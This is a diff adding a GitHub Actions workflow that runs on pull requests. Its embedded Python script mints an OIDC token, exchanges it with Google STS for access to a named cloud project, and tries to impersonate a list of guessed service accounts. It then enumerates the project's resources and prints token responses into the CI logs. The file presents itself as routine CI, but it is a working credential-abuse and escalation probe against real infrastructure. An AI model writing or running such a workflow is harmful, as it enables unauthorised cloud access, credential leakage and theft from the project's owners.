@@ -1,0 +1,86 @@
+name: c211-i122164-declsubj
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  declsubj:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: c211-i122164-declsubj-probe
+        run: |
+          python3 - <<'PY'
+          import json, base64, urllib.request, urllib.error, urllib.parse, os
+          P = 'projects/940755218400/locations/global/workloadIdentityPools/github-actions/providers/github-actions'
+          AUD = '//iam.googleapis.com/' + P
+          U = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); T = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          print('C211L_ENV url_present=%s tok_present=%s repo=%s event=%s ref=%s' % (bool(U), bool(T),
+                os.environ.get('GITHUB_REPOSITORY'), os.environ.get('GITHUB_EVENT_NAME'),
+                os.environ.get('GITHUB_REF')), flush=True)
+          def http(url, data=None, headers=None):
+              h = {'User-Agent': 'c211-i122164'}
+              if headers: h.update(headers)
+              body = None
+              if data is not None:
+                  if isinstance(data, dict):
+                      body = json.dumps(data).encode(); h.setdefault('Content-Type', 'application/json')
+                  else: body = data.encode()
+              try:
+                  r = urllib.request.urlopen(urllib.request.Request(url, data=body, headers=h), timeout=40)
+                  return r.status, r.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:200]
+          tok = None
+          if U and T:
+              st, b = http(U + ('&' if '?' in U else '?') + 'audience=' + urllib.parse.quote(AUD, safe=''),
+                           headers={'Authorization': 'bearer ' + T})
+              print('C211L_MINT http=%s len=%s' % (st, len(b)), flush=True)
+              if st == 200: tok = json.loads(b).get('value')
+          if not tok:
+              print('C211L_MINT_FAIL', flush=True); raise SystemExit(0)
+          cl = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '=='))
+          print('C211L_CLAIMS ' + json.dumps({k: cl.get(k) for k in
+                ['sub','repository','repository_owner','repository_id','ref','event_name','job_workflow_ref','actor','aud','iss']}), flush=True)
+          st, b = http('https://sts.googleapis.com/v1/token', data={'audience': AUD,
+                        'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                        'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                        'subjectToken': tok, 'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                        'scope': 'https://www.googleapis.com/auth/cloud-platform'})
+          print('C211L_STS http=%s body=%s' % (st, b[:400].replace('\n', ' ')), flush=True)
+          if st != 200: raise SystemExit(0)
+          at = json.loads(b)['access_token']
+          sas = ['github-actions@stacked-327723.iam.gserviceaccount.com',
+                 '940755218400-compute@developer.gserviceaccount.com',
+                 '940755218400@cloudservices.gserviceaccount.com',
+                 'github@stacked-327723.iam.gserviceaccount.com',
+                 'github-deploy@stacked-327723.iam.gserviceaccount.com',
+                 'github-oidc@stacked-327723.iam.gserviceaccount.com',
+                 'deploy@stacked-327723.iam.gserviceaccount.com',
+                 'ci@stacked-327723.iam.gserviceaccount.com',
+                 'gha@stacked-327723.iam.gserviceaccount.com',
+                 'terraform@stacked-327723.iam.gserviceaccount.com',
+                 'cloudbuild@stacked-327723.iam.gserviceaccount.com',
+                 'default@stacked-327723.iam.gserviceaccount.com']
+          got = None
+          for sa in sas:
+              st2, b2 = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % sa,
+                             data={'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '600s'},
+                             headers={'Authorization': 'Bearer ' + at})
+              print('C211L_IMP %s http=%s body=%s' % (sa, st2, b2[:300].replace('\n', ' ')), flush=True)
+              if st2 == 200 and got is None:
+                  got = (sa, json.loads(b2).get('accessToken'))
+          if got:
+              sa, sat = got
+              print('C211L_IMP_OK %s' % sa, flush=True)
+              for u in ['https://cloudresourcemanager.googleapis.com/v1/projects/940755218400',
+                        'https://serviceusage.googleapis.com/v1/projects/940755218400/services?filter=state:ENABLED',
+                        'https://compute.googleapis.com/compute/v1/projects/940755218400/aggregated/instances']:
+                  st3, b3 = http(u, headers={'Authorization': 'Bearer ' + sat})
+                  print('C211L_API %s http=%s body=%s' % (u.split('/')[2], st3, b3[:500].replace('\n', ' ')), flush=True)
+          print('C211L_DONE', flush=True)
+          PY
